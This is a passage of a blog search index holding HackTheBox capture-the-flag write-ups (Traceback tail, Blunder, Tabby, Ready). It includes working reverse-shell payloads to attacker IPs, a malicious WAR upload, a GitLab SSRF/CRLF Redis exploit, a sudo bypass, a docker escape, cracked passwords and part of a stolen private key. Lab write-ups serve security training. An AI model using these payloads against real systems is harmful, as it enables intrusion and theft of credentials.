/etc/update-motd.d/91-release-upgrade 2020/03/15 15:45:01 CMD: UID=0 PID=28310 | cut -d -f4 2020/03/15 15:45:01 CMD: UID=0 PID=28309 | /usr/bin/python3 -Es /usr/bin/lsb_release -sd 2020/03/15 15:45:01 CMD: UID=0 PID=28308 | /bin/sh /etc/update-motd.d/91-release-upgrade 2020/03/15 15:45:02 CMD: UID=0 PID=28315 | sshd: sysadmin [priv] 2020/03/15 15:45:02 CMD: UID=1001 PID=28316 | -sh . /etc/update-motd.d/50-motd-news is called every time a user logs into the box, with root privileges. However, this file can be edited from non-root users. Abusing this issue, let‚Äôs use the reverse shell script used before in order to obtain a reverse shell as root at the next login. sysadmin@traceback:~$ nano /etc/update-mot.d/50-motd-news #!/bin/bash /bin/bash /tmp/revShell.sh ... Trophy . Aim for the sky, but move slowly, enjoying every step along the way. It is all those little steps that make the journey complete. - Chanda Kochhar . &lt;path d=\"M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z\" \"/&gt; . Share . Made by 0xbro with üíú üíõ . ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/2020-03-14-Traceback/",
    "relUrl": "/writeups/HackTheBox/2020-03-14-Traceback/"
  },"23": {
    "doc": "Traceback",
    "title": "Traceback",
    "content": "14 Mar 2020 | Reading time: ~5 min . ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/2020-03-14-Traceback/",
    "relUrl": "/writeups/HackTheBox/2020-03-14-Traceback/"
  },"24": {
    "doc": "Blunder",
    "title": "HackTheBox - Blunder [Easy] ",
    "content": "#HackTheBox #Easy #B2R #Linux #Bludit #custom-wordlist #brute-force #CVE-2019-16113 #RCE #lateral-movement #password-guessing #hardcoded-credentials #sudo-privesc #CVE-2019-14287 . . | Improved skills: | Used tools: | Introduction &amp; Foothold | Lateral Movement to Hugo | Privilege Escalation | Trophy | . Improved skills: . | Wordlist customization | Python coding | CVE Research | Manual Exploitation | Configuration file review | . Used tools: . | nmap | gobuster | cewl | Burp Suite | crackstation.net | . Introduction &amp; Foothold . Blunder is an easy box based on CVE research and a real-life approach, like OSCP machines. It requires good enumeration and a deep research during post exploitation. Let‚Äôs start as always with a nmap scan in order to find open ports and services: . root@kali:/HackTheBox/Machine/Blunder# nmap 10.10.10.191 -sV -sC -O -A --script=banner -oA nmap.txt PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-generator: Blunder |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Blunder | A blunder of interesting facts Aggressive OS guesses: HP P2000 G3 NAS device (91%), OpenWrt Kamikaze 7.09 (Linux 2.6.22) (88%), Linux 3.1 (88%), Linux 3.2 (88%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), OpenWrt 0.9 - 7.09 (Linux 2.4.30 - 2.4.34) (87%), OpenWrt White Russian 0.9 (Linux 2.4.30) (87%), Asus RT-AC66U router (Linux 2.6) (87%), Asus RT-N16 WAP (Linux 2.6) (87%), Asus RT-N66U WAP (Linux 2.6) (87%) No exact OS matches for host (test conditions non-ideal). The tool reveals that there is only a single port open on the box: the HTTP port 80, with an Apache httpd 2.4.41 web server over. Because we don‚Äôt have any useful information, we need to perform some manual recon browsing the site. Unfortunately visiting the site we found only few articles without useful stuff (for now :wink:). We need to enumerate other existing files and directories using gobuster in search of other useful information: . root@kali:/HackTheBox/Machine/Blunder# gobuster dir -u http://10.10.10.191/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40 -x .html,.php,.txt,.old ... /about (Status: 200) /0 (Status: 200) /admin (Status: 301) /install.php (Status: 200) /robots.txt (Status: 200) /todo.txt (Status: 200) /usb (Status: 200) /LICENSE (Status: 200) . Gobuster found a bunch of elements, some of which very interesting: first of all the /admin directory (which present an authentication form whose we don‚Äôt know credentials), the /robots.txt (that in this case isn‚Äôt very helpful), the /install.php file and the /todo.txt file, containing the following text: . -Update the CMS -Turn off FTP - DONE -Remove old users - DONE -Inform fergus that the new blog needs images - PENDING . Good, it seems we have found a user called fergus. Moreover, reading the output of install.php, we discovered that Blunder is nothing else than a bludit installation. Now that we found the application name, we need to find the respective software version. To achieve this, we can visit the official bludit site and search within the documentation for the directory structure and where important files are. . Alright, we know that we are dealing with Bludit 3.9.2 and we also know the structure of the various directories and that the listing is enabled. All useful stuff but at the moment it seems that the only way to proceed is bypassing the login form. Let‚Äôs try standard / weak credentials with the fergus user, but without success. Trying to make brute force with standard wordlist instead we get a ban. Googling a bit I found this article about bypassing the Bludit Brute Force Mitigation, however no wordlist still works. Let‚Äôs try to create our personalized wordlist using cewl: . root@kali:/HackTheBox/Machine/Blunder# cewl -m 5 -w customList.txt http://10.10.10.191 CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/) root@kali:/mnt/hgfs/ownCloud/Documents/CTF/HackTheBox/Machine/Blunder/files# tail customList.txt Blunder Pagination HackTheBox typically visited simple things contact small story . and execute again the article‚Äôs script, this time with our wordlist . Here we are, we got the password! We can proceed into the admin section. Searching online we find that there are several vulnerabilities for bludit, especially for this particular version, including an authenticated RCE that can be perfect for us as we already get the creds. The CVE-2019-16113 exploitation allows two different approaches: . | using the metasploit exploit | manual exploitation following this thread | . Since I am practicing for OSCP, I will follow the manual approach. As said in the github thread listed above, Bludit 3.9.2 present an RCE vulnerability in an authenticated site section, in detail the vulnerable function is the images upload. Due to some bad checks, it is possible to upload an image with some code injected into an arbitrary folder, uploading a .htaccess file and execute the code injected into the image. These are the detailed steps: . | Using Burp Suite we intercept and edit the image upload request in order to arbitrary change the path where the image will be saved (editing the uuid field) and injecting our php payload. Server response is a 200 OK, meaning that the file has been uploaded . | Using the Burp Suite repeater function we edit the previous request in order to upload an .htaccess file that allow the image‚Äôs injected code execution. Note: the server responds with an error message, however the file has been uploaded anyway . | Sending a GET request to the image, we are executing the code injected into. Because the payload was . &lt;?php file_put_contents(\"../../uploads/webShell.php\",\"&lt;?php exec(\\\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.28/1234 0&gt;&amp;1'\\\"); ?&gt; \"); ?&gt; . we are creating a php reverse shell. | Now that we have a php reverse shell on the server we just have to listen with netcat waiting for the connection and run the php file. | . Lateral Movement to Hugo . Now that we are into the box with a low-privileged shell, we need to find a way to move laterally to someone else with higher privileges. Let‚Äôs go hunting for hardcoded passwords into configuration files. The /bl-content/databases/ seems to be the right place, and in fact the /users.php file contains what we were looking for: a hashed password of a machine user. www-data@blunder:/var/www$ cat bludit-3.10.0a/bl-content/databases/users.php &lt;?php defined('BLUDIT') or die('Bludit CMS.'); ?&gt; { \"admin\": { \"nickname\": \"Hugo\", \"firstName\": \"Hugo\", \"lastName\": \"\", \"role\": \"User\", \"password\": \"faca404fd5c0a31cf1897b823c695c85cffeb98d\", \"email\": \"\", \"registered\": \"2019-11-27 07:40:55\", \"tokenRemember\": \"\", \"tokenAuth\": \"b380cb62057e9da47afce66b4615107d\", \"tokenAuthTTL\": \"2009-03-15 14:00\", \"twitter\": \"\", \"facebook\": \"\", \"instagram\": \"\", \"codepen\": \"\", \"linkedin\": \"\", \"github\": \"\", \"gitlab\": \"\"} } . The hash can be easily reverted using online tools like crackstation, and it turns out to be a sha1 hash of Password120 . Now we are able to switch to hugo! . Privilege Escalation . Privilege escalation can be reached through a rapid google research. Now that we are hugo we can check if he can run some sudo commands: . hugo@blunder:~$ sudo -V Sudo version 1.8.25p1 Sudoers policy plugin version 1.8.25p1 Sudoers file grammar version 46 Sudoers I/O plugin version 1.8.25p1 hugo@blunder:~$ sudo -l Matching Defaults entries for hugo on blunder: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User hugo may run the following commands on blunder: (ALL, !root) /bin/bash . We notice that hugo can‚Äôt run /bin/bash as root. However, a rapid google research reveals that for sudo 1.8.28 or less exists a public exploit (47502) (CVE-2019-14287) that allow to perform privilege escalation executing commands as user #-1. ‚Ä¶ Sudo doesn‚Äôt check for the existence of the specified user id and executes the with arbitrary user id with the sudo priv . So ‚Ä¶ . hugo@blunder:~$ sudo -u#-1 /bin/bash root@blunder:/home/hugo# id uid=0(root) gid=1001(hugo) groups=1001(hugo) root@blunder:/home/hugo# . we are root! . Trophy . Persistence is very important. You should not give up unless you are forced to give up.&lt;br&gt; - Elon Musk . &lt;path d=\"M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z\" \"/&gt; . Share . Made by 0xbro with üíú üíõ . ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/2020-05-30-Blunder/",
    "relUrl": "/writeups/HackTheBox/2020-05-30-Blunder/"
  },"25": {
    "doc": "Blunder",
    "title": "Blunder",
    "content": "30 May 2020 | Reading time: ~6 min . ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/2020-05-30-Blunder/",
    "relUrl": "/writeups/HackTheBox/2020-05-30-Blunder/"
  },"26": {
    "doc": "Tabby",
    "title": "HackTheBox - Tabby [Easy] ",
    "content": "#HackTheBox #Easy #Linux #LFI #WAR #tomcat #cracking-zip-files #lxd-privesc #B2R . . | Improved skills: | Used tools: | Introduction &amp; Foothold | Lateral Movement to ash | Privilege Escalation | Trophy | . Improved skills: . | LFI | Tomcat WAR exploitation | Cracking .zip files | lxd Privilege Escalation | . Used tools: . | nmap | gobuster | msfvenom | LinEnum.sh | fcrackzip | . Introduction &amp; Foothold . Tabby is an easy HTB machine focused on the manually exploitation of a Tomacat server using a .WAR reverse shell and the exploitation of a misconfigured group permission which allow to escalate to root abusing lxd rights. Let‚Äôs start as always with an nmap scan: . root@kali:~/HackTheBox# nmap -Pn -sCV -p22,80,8080 -oN nmap/Basic_10.10.10.194.nmap 10.10.10.194 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open http Apache Tomcat 9.0.31 |_http-open-proxy: Proxy might be redirecting requests |_http-title: Apache Tomcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel . We find out that there are three services running on the box, two of which are web servers (an Apache httpd 2.4.41 and an Apache Tomcat 9.0.31). Visiting the first site we discover that the host of the box is megahosting.htb. In order to properly enumerate the box we need to resolve it correctly . echo \"10.10.10.194¬†¬†¬†¬†megahosting.it\" &gt;&gt; /etc/hosts . Now that we are effectively ready, let‚Äôs start enumerating every page of the first web server. After few minutes I found the http://megahosting.htb/news.php?file=statement page, which results to be vulnerable to Local File Inclusion (LFI). Because we got an LFI vulnerability, the logical next step was to try to exploit it in order to get a Remote Code Execution, but unfortunately none of the existing methods worked‚Ä¶ so I decided to start to enumerate the second web server (tomcat), looking for another entry point. root@kali:~/HackTheBox# gobuster dir -u http://10.10.10.194:8080/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.html,.txt ... /index.html (Status: 200) /docs (Status: 302) /examples (Status: 302) /manager (Status: 302) . Among all the various directories, /manager immediately caught my attention: trying to logging in, the server reveals which file contains the credentials, allowing us to use the LFI to get them. Finding tomcat-users.xml was a pain as the installation of the web server was done without following standards paths and rules, however, after a couple of hours I was able to read the file, located in /usr/share/tomcat9/etc/tomcat-users.xml . Good! Now we are able to login into the /manager directory and proceeds. Since the tomcat user are assigned the roles of admin-gui and manager-script, he has the permission to access the host-manager webapp via web gui (from which nothing can be done) but also to interact via cli with the manager webapp, which allows us to upload .war files to the server (see the official documentation). Once we find the way, let‚Äôs create our reverse shell through msfconsole . root@kali:/var/www/html# msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.18 LPORT=9876 -f war &gt; maoutis.war Payload size: 1095 bytes Final size of war file: 1095 bytes root@kali:/var/www/html# ls -al maoutis.war -rw-r--r-- 1 root root 1095 Jun 29 19:08 maoutis.war . load it on the server . root@kali:~/HackTheBox/Machine/Tabby/files# curl -u 'tomcat':'$3cureP4s5w0rd123!' -T maoutis.war 'http://10.10.10.194:8080/manager/text/deploy?path=/maoutis' OK - Deployed application at context path [/maoutis] root@kali:~/HackTheBox/Machine/Tabby/files# curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/list OK - Listed applications for virtual host [localhost] /:running:0:ROOT /maoutis:running:0:maoutis /examples:running:0:/usr/share/tomcat9-examples/examples /host-manager:running:1:/usr/share/tomcat9-admin/host-manager /manager:running:0:/usr/share/tomcat9-admin/manager /docs:running:0:/usr/share/tomcat9-docs/docs and run it to get access as *tomcat* user. root@kali:~/HackTheBox/Machine/Tabby/files# curl -u 'tomcat':'$3cureP4s5w0rd123!' http://10.10.10.194:8080/maoutis/ . root@kali:~# nc -lvp 9876 python3 -c 'import pty; pty.spawn(\"/bin/bash\")' tomcat@tabby:/var/lib/tomcat9$ export TERM=screen CTRL+Z root@kali:~/HackTheBox# stty raw -echo root@kali:~/HackTheBox# fg tomcat@tabby:/var/lib/tomcat9$ . Lateral Movement to ash . Once gained the shell, further enumeration reveals that the user of the box is ash. Running LinEnum.sh we discovered a .zip backup file inside /var/www/html/files/ which require to be cracked in order to be unzipped. Let‚Äôs use fcrackzip in order to crack the archive. root@kali:~/HackTheBox/Machine/Tabby/files# fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' 16162020_backup.zip PASSWORD FOUND!!!!: pw == admin@it . Password found! While inside the archive we didn‚Äôt find anything useful, trying to use the password to switch to ash reveals that the same password has been reused. tomcat@tabby:/var/www/html/files$ su ash Password: admin@it ash@tabby:/var/www/html/files$ uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd) . Well done! We are ash! . Privilege Escalation . Running again LinEnum.sh it reveals that we are members of the lxd group and that exists a way to abuse this permission in order to became root. Searching on Google I found this article, which describes how an account on the system that is a member of the lxd group is able to escalate the root privilege by exploiting the features of LXD. First, download the lxd-alpine-builder locally on the kali machine and built it as root . $git clone https://github.com/saghul/lxd-alpine-builder.git $cd lxd-alpine-builder $sudo bash build-alpine . Probably will appear errors like ‚Äútar: Ignoring unknow ‚Ä¶ ‚Äú. Don‚Äôt worry and continue ¬†¬†¬†¬†with the privilege escalation process. Then upload the .tar file on the ash home directory and import it inside lxc . Once finished, we will be root! . Trophy . If you can't give me poetry, can't you give me poetical science? - Ada Lovelace . &lt;path d=\"M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z\" \"/&gt; . Share . Made by 0xbro with üíú üíõ . ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/2020-07-05-Tabby/",
    "relUrl": "/writeups/HackTheBox/2020-07-05-Tabby/"
  },"27": {
    "doc": "Tabby",
    "title": "Tabby",
    "content": "05 Jul 2020 | Reading time: ~5 min . ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/2020-07-05-Tabby/",
    "relUrl": "/writeups/HackTheBox/2020-07-05-Tabby/"
  },"28": {
    "doc": "Ready",
    "title": "HackTheBox - Ready [Medium] ",
    "content": "#HackTheBox #Medium #Linux #GitLab #SSRF #CVE-2018-19571 #CRLF-Injection #CVE-2018-19585 #redis #hardcoded-credentials #password-reuse #docker-breakout #B2R #writeup . . | Introduction . | Improved skills: | Used tools: | . | Enumeration | Foothold | Lateral Movement | Privilege Escalation | Trophy | . Introduction . Ready is a medium difficulty Linux box based on a vulnerable version of GitLab Community Edition, which suffers both a Server Side Request Forgery (CVE-2018-1957) and a CRLF injection (CVE-2018-195), allowing to obtain a reverse shell as git user. After obtained a foothold, internal enumeration allowed to find hardcoded-credentials which lead to root access inside the docker container. Docker‚Äôs root user was allowed to run fdisk and mount the external system, making possible to stole root ssh key and obtain a high privileged shell on the original target. Improved skills: . | SSRF Attacks | CRLF Attacks | Docker Escape | . Used tools: . | nmap | burpsuite | hackvector | netcat | . Enumeration . Enumerated all TCP ports: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Ready] ‚îî‚îÄ$ sudo nmap -p- -sS 10.10.10.220 -oN scans/all-tcp-ports.txt -v ... PORT STATE SERVICE 22/tcp open ssh 5080/tcp open onscreen Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 40.94 seconds Raw packets sent: 65582 (2.886MB) | Rcvd: 65536 (2.621MB) . Enumerated open TCP ports: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Ready] ‚îî‚îÄ$ sudo nmap -p22,5080 -sV -sT -sC -A 10.10.10.220 -oN scans/open-tcp-ports.txt Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-29 16:02 EDT Nmap scan report for 10.10.10.220 Host is up (0.051s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 5080/tcp open http nginx | http-robots.txt: 53 disallowed entries (15 shown) | / /autocomplete/users /search /api /admin /profile | /dashboard /projects/new /groups/new /groups/*/edit /users /help |_/s/ /snippets/new /snippets/*/edit | http-title: Sign in \\xC2\\xB7 GitLab |_Requested resource was http://10.10.10.220:5080/users/sign_in |_http-trane-info: Problem with XML parsing of /evox/about Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using proto 1/icmp) HOP RTT ADDRESS 1 49.83 ms 10.10.14.1 2 49.93 ms 10.10.10.220 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.69 seconds . Nmap revealed a GitLab installation on port 5080 and a OpenSSH service on port 22. A custom account was registered in order to access the GitLab instance: . After get logged in, GitLab Version was enumerated from the ‚Äúhelp‚Äù page: . Foothold . Googling around was found that GitLab Community Edition 11.4.7 suffered a Remote Code Execution vulnerability caused by a Server Side Request Forgery (CVE-2018-1957) and a CRFL Injection (CVE-2018-195). Among the various PoCs, the analysis conducted by liveoverflow was definitely one of the best choice to follow to be able to penetrate this machine. To summarize the vulnerability, arbitrary code execution can be achieved importing a new git project from the redis localhost port abusing a SSRF vulnerability in conjunction with the CRLF injection. This combination of vulnerabilities allowed to execute arbitrary code inside redis and so obtain a reverse shell. First, a test project was created and the corresponding import request was intercepted using burpsuite: . POST /projects HTTP/1.1 Host: 10.10.10.220:5080 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://10.10.10.220:5080/projects/new Content-Type: application/x-www-form-urlencoded Content-Length: 317 Origin: http://10.10.10.220:5080 Connection: close Cookie: _gitlab_session=09091cb83a47305f01ddec7c77a45d15; sidebar_collapsed=true; event_filter=all Upgrade-Insecure-Requests: 1 utf8=%E2%9C%93&amp;authenticity_token=aftxcmnuS8Omyy8hNlcAIh1FS4bve7Ynayo4MGngN2PDRqLqEX40n3qKOSG9ZTLRNR9rxOakhyzSTKGlyqrl6Q%3D%3D&amp;project%5Bimport_url%5D=test&amp;project%5Bci_cd_only%5D=false&amp;project%5Bname%5D=test&amp;project%5Bnamespace_id%5D=3&amp;project%5Bpath%5D=test&amp;project%5Bdescription%5D=&amp;project%5Bvisibility_level%5D=0 . After that, the request was modified to contain the malicious payload, which in this case send to the attacker machine the string ‚Äúpippo‚Äù. To avoid problems with special characters the url-encode of the whole payload was executed using the burpsuite plugin hackvector. POST /projects HTTP/1.1 Host: 10.10.10.220:5080 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://10.10.10.220:5080/projects/new Content-Type: application/x-www-form-urlencoded Content-Length: 772 Origin: http://10.10.10.220:5080 Connection: close Cookie: _gitlab_session=09091cb83a47305f01ddec7c77a45d15; sidebar_collapsed=true; event_filter=all Upgrade-Insecure-Requests: 1 utf8=%E2%9C%93&amp;authenticity_token=aftxcmnuS8Omyy8hNlcAIh1FS4bve7Ynayo4MGngN2PDRqLqEX40n3qKOSG9ZTLRNR9rxOakhyzSTKGlyqrl6Q%3D%3D&amp;project%5Bimport_url%5D=&lt;@urlencode_all&gt;git://[0:0:0:0:0:ffff:127.0.0.1]:6379/ multi sadd resque:gitlab:queues system_hook_push lpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"GitlabShellWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"open(\\'|echo pippo | nc 10.10.14.24 1234\\').read\\\"],\\\"retry\\\":3,\\\"queue\\\":\\\"system_hook_push\\\",\\\"jid\\\":\\\"ad52abc5641173e217eb2e52\\\",\\\"created_at\\\":1513714403.8122594,\\\"enqueued_at\\\":1513714403.8129568}\" exec exec /ssrf.git &lt;@/urlencode_all&gt;&amp;project%5Bci_cd_only%5D=false&amp;project%5Bname%5D=test&amp;project%5Bnamespace_id%5D=3&amp;project%5Bpath%5D=test&amp;project%5Bdescription%5D=&amp;project%5Bvisibility_level%5D=0 . The resulting request was the following one: . Listening on port 1234 we get a response back from the server with the message contained within the payload, meaning that the exploit was successfully executed. ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Ready] ‚îî‚îÄ$ sudo nc -nlvp 1234 listening on [any] 1234 ... connect to [10.10.14.24] from (UNKNOWN) [10.10.10.220] 39212 pippo . A reverse connection can be obtained in the same way upgrading the previous PoC to contain a netcat reverse shell: . &lt;@urlencode_all&gt;git://[0:0:0:0:0:ffff:127.0.0.1]:6379/ multi sadd resque:gitlab:queues system_hook_push lpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"GitlabShellWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"open(\\'| nc 10.10.14.24 1234 -e /bin/bash\\').read\\\"],\\\"retry\\\":3,\\\"queue\\\":\\\"system_hook_push\\\",\\\"jid\\\":\\\"ad52abc5641173e217eb2e52\\\",\\\"created_at\\\":1513714403.8122594,\\\"enqueued_at\\\":1513714403.8129568}\" exec exec /ssrf.git &lt;@/urlencode_all&gt; . Using the above payload, a reverse shell was obtained successfully: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Ready] ‚îî‚îÄ$ sudo nc -nlvp 1234 [sudo] password for kali: listening on [any] 1234 ... connect to [10.10.14.24] from (UNKNOWN) [10.10.10.220] 39772 id uid=998(git) gid=998(git) groups=998(git) which python which python3 /opt/gitlab/embedded/bin/python3 python3 -c 'import pty; pty.spawn(\"/bin/bash\")' git@gitlab:~/gitlab-rails/working$ cd /home cd /home git@gitlab:/home$ ls ls dude git@gitlab:/home$ cd dude cd dude git@gitlab:/home/dude$ ls ls user.txt git@gitlab:/home/dude$ cat user.txt cat user.txt e1e30b052b6ec0670698805d745e7682 . Lateral Movement . Local enumeration revealed a readable backup file containing credentials and a docker-compose suggesting we were inside docker: . git@gitlab:/opt/backup$ cat gitlab.rb | grep password #### Email account password # gitlab_rails['incoming_email_password'] = \"[REDACTED]\" # password: '_the_password_of_the_bind_user' # password: '_the_password_of_the_bind_user' # '/users/password', #### Change the initial default admin password and shared runner registration tokens. # gitlab_rails['initial_root_password'] = \"password\" # gitlab_rails['db_password'] = nil # gitlab_rails['redis_password'] = nil gitlab_rails['smtp_password'] = \"wW59U!ZKMbG9+*#h\" # gitlab_shell['http_settings'] = { user: 'username', password: 'password', ca_file: '/etc/ssl/cert.pem', ca_path: '/etc/pki/tls/certs', self_signed_cert: false} ##! `SQL_USER_PASSWORD_HASH` can be generated using the command `gitlab-ctl pg-password-md5 gitlab` # postgresql['sql_user_password'] = 'SQL_USER_PASSWORD_HASH' # postgresql['sql_replication_password'] = \"md5 hash of postgresql password\" # You can generate with `gitlab-ctl pg-password-md5 &lt;dbuser&gt;` # redis['password'] = 'redis-password-goes-here' ####! **Master password should have the same value defined in ####! redis['password'] to enable the instance to transition to/from # redis['master_password'] = 'redis-password-goes-here' # geo_secondary['db_password'] = nil # geo_postgresql['pgbouncer_user_password'] = nil # password: PASSWORD ###! generate this with `echo -n '$password + $username' | md5sum` # pgbouncer['auth_query'] = 'SELECT username, password FROM public.pg_shadow_lookup($1)' # password: MD5_PASSWORD_HASH # postgresql['pgbouncer_user_password'] = nil git@gitlab:/opt/backup$ cat docker-compose.yml version: '2.4' services: web: image: 'gitlab/gitlab-ce:11.4.7-ce.0' restart: always hostname: 'gitlab.example.com' environment: GITLAB_OMNIBUS_CONFIG: | external_url 'http://172.19.0.2' redis['bind']='127.0.0.1' redis['port']=6379 gitlab_rails['initial_root_password']=File.read('/root_pass') ... privileged: true ... Because root and nil shared the same password, it was possible to escalate to root reusing nil credentials: . git@gitlab:/opt/backup$ su root Password: root@gitlab:/opt/backup# id uid=0(root) gid=0(root) groups=0(root) . Privilege Escalation . Because the container had the privileged flag set to true and root access was gained, it was possible to escape from it and get access on the original target mounting the corresponding partition. A PoC of the method can be read on the HackTricks blog . Enumerated all the partition using fdisk and mounted the target filesystem inside the container: . root@gitlab:/mnt# fdisk -l ... Device Start End Sectors Size Type /dev/sda1 2048 4095 2048 1M BIOS boot /dev/sda2 4096 37746687 37742592 18G Linux filesystem /dev/sda3 37746688 41940991 4194304 2G Linux swap root@gitlab:/mnt# mount /dev/sda2 /mnt/tmp/ root@gitlab:/mnt# mkdir tmp root@gitlab:/mnt# mount /dev/sda2 /mnt/tmp/ . Leaked the root private key: . root@gitlab:/mnt/tmp/root# ls docker-gitlab ready-channel root.txt snap root@gitlab:/mnt/tmp/root# cd .ssh root@gitlab:/mnt/tmp/root/.ssh# ls authorized_keys id_rsa id_rsa.pub root@gitlab:/mnt/tmp/root/.ssh# cat id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q ... aKvV8jR1G+70v4GVye79Kk7TL5uWFDFWzVPwVID9QCYJjuDlLBaFDnUOYFZW52gz vJzok/kcmwcBlGfmRKxlS0O6n9dAiOLY46YdjyS8F8hNPOKX6rCd -----END RSA PRIVATE KEY----- . Obtained a high privileged shell using the stolen key: . ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Ready] ‚îî‚îÄ$ nano loot/root.rsa -----BEGIN RSA PRIVATE KEY----- MIIEowIBAAKCAQEAvyovfg++zswQT0s4YuKtqxOO6EhG38TR2eUaInSfI1rjH09Q sle1ivGnwAUrroNAK48LE70Io13DIfE9rxcotDviAIhbBOaqMLbLnfnnCNLApjCn ... ‚îå‚îÄ‚îÄ(kali„âøkali)-[~/CTFs/HTB/box/Ready] ‚îî‚îÄ$ ssh root@10.10.10.220 -i loot/root.rsa Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64) ... Last login: Thu Feb 11 14:28:18 2021 root@ready:~# whoami &amp;&amp; hostname &amp;&amp; cat /root/root.txt &amp;&amp; ifconfig -a root ready b7f98681505cd39066f67147b103c2b3 br-bcb73b090b3f: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 172.19.0.1 netmask 255.255.0.0 broadcast 172.19.255.255 inet6 fe80::42:28ff:fe4d:2cbf prefixlen 64 scopeid 0x20&lt;link&gt; ether 02:42:28:4d:2c:bf txqueuelen 0 (Ethernet) ... Trophy . The good thing about science is that it's true whether or not you believe in it. - Neil deGrasse Tyson . &lt;path d=\"M12.2685,74.7342 L66.4215,74.7342 L43.1485,3.1092 C41.9515,-0.5768 36.7375,-0.5758 35.5405,3.1092 L12.2685,74.7342 Z\" \"/&gt; . Share . Made by 0xbro with üíú üíõ . ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/2021-05-14-Ready/",
    "relUrl": "/writeups/HackTheBox/2021-05-14-Ready/"
  },"29": {
    "doc": "Ready",
    "title": "Ready",
    "content": "14 May 2021 | Reading time: ~8 min . ",
    "url": "https://maoutis.github.io/writeups/HackTheBox/2021-05-14-Ready/",
    "relUrl": "/writeups/HackTheBox/2021-05-14-Ready/"
  },"30": {
    "doc": "Delivery",
    "title": "HackTheBox - Delivery [Easy] ",
